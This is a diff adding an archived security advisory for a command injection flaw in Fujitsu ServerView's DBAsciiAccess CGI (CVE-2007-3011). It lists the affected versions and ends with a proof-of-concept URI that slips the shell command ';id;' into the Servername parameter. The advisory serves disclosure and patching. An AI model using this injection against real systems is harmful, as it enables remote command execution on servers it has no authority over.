@@ -1,0 +1,198 @@
+#SpeeDr00t@Black Falcon<br>#bid24762<p><b><span style="font-size: 18pt;">Fujitsu ServerView DBASCIIAccess Remote Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/24762/info">info</a><br><a href="http://www.securityfocus.com/bid/24762/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/24762/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/24762/solution">solution</a><br><a href="http://www.securityfocus.com/bid/24762/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				24762
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-3011<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 04 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 05 2007 06:07PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				RedTeam Pentesting GmbH is credited with the discovery of this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Fujitsu ServerView 4.50.8 <br/>
+					
+				
+					Fujitsu ServerView 4.50.7 <br/>
+					
+				
+					Fujitsu ServerView 4.50.6 <br/>
+					
+				
+					Fujitsu ServerView 4.50.5 <br/>
+					
+				
+					Fujitsu ServerView 4.50.4 <br/>
+					
+				
+					Fujitsu ServerView 4.50.3 <br/>
+					
+				
+					Fujitsu ServerView 4.50.2 <br/>
+					
+				
+					Fujitsu ServerView 4.50.1 <br/>
+					
+				
+					Fujitsu ServerView 4.40.6 <br/>
+					
+				
+					Fujitsu ServerView 4.40.5 <br/>
+					
+				
+					Fujitsu ServerView 4.40.4 <br/>
+					
+				
+					Fujitsu ServerView 4.40.3 <br/>
+					
+				
+					Fujitsu ServerView 4.40.2 <br/>
+					
+				
+					Fujitsu ServerView 4.40.1 <br/>
+					
+				
+					Fujitsu ServerView 4.30.13 <br/>
+					
+				
+					Fujitsu ServerView 4.30.12 <br/>
+					
+				
+					Fujitsu ServerView 4.30.11 <br/>
+					
+				
+					Fujitsu ServerView 4.30.10 <br/>
+					
+				
+					Fujitsu ServerView 4.30.9 <br/>
+					
+				
+					Fujitsu ServerView 4.30.8 <br/>
+					
+				
+					Fujitsu ServerView 4.30.7 <br/>
+					
+				
+					Fujitsu ServerView 4.30.6 <br/>
+					
+				
+					Fujitsu ServerView 4.30.5 <br/>
+					
+				
+					Fujitsu ServerView 4.30.4 <br/>
+					
+				
+					Fujitsu ServerView 4.30.3 <br/>
+					
+				
+					Fujitsu ServerView 4.30.2 <br/>
+					
+				
+					Fujitsu ServerView 4.30.1 <br/>
+					
+				
+					Fujitsu ServerView 3.6 L98<br/>
+					
+				
+					Fujitsu ServerView  4.11 L81<br/>
+					
+				
+					Fujitsu ServerView  4.11 L11B<br/>
+					
+				
+					Fujitsu ServerView  4.10 L11<br/>
+					
+				
+					Fujitsu ServerView  3.60 L99<br/>
+					
+				
+					Fujitsu ServerView  3.60 L98<br/>
+					
+				
+					Fujitsu ServerView  2.5<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Fujitsu ServerView 4.50.9 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit this issue via a browser.<br/><br/>The following proof-of-concept URI is available (note that this URI has been edited for readability):<br/><br/><br/>http://www.example.com/cgi-bin/ServerView/<br/>    SnmpView/DBAsciiAccess<br/>    ?SSL=<br/>    &amp;Application=ServerView/SnmpView<br/>    &amp;Submit=Submit<br/>    &amp;UserID=1<br/>    &amp;Profile=<br/>    &amp;DBAccess=ASCII<br/>    &amp;Viewing=-1<br/>    &amp;Action=Show<br/>    &amp;ThisApplication=TestConnectivityFrame<br/>    &amp;DBElement=ServerName<br/>    &amp;DBValue=bcmes<br/>    &amp;DBList=snism<br/>    &amp;UserValue=<br/>    &amp;DBTableList=SERVER_LIST<br/>    &amp;Sorting=<br/>    &amp;ParameterList=What--primary,,<br/>    OtherCommunity--public,,<br/>    SecondIP--,,<br/>    Timeout--5,,<br/>    Community--public,,<br/>    ServerName--bcmes,,<br/>    Servername--127.0.0.1;id;,,               # vulnerable parameter<br/>    SType--Server
+	
+		<ul>
+</ul>
+</div>
